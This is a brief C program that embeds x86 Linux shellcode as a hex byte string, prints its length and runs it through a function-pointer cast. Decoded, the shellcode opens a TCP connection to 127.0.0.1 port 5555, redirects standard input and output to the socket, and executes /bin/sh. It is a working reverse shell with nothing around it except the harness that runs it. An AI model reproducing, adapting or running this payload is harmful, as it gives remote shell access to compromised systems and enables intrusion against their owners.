#include<stdio.h>
#include<string.h>

unsigned char code[] = \ 
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x31\xc0\xb8\x80\x01\x01\x02\x2d\x01\x01\x01\x01\x50\x66\x68\x15\xb3\x66\x6a\x02\x89\xe6\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
printf("Shellcode Length:  %d", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
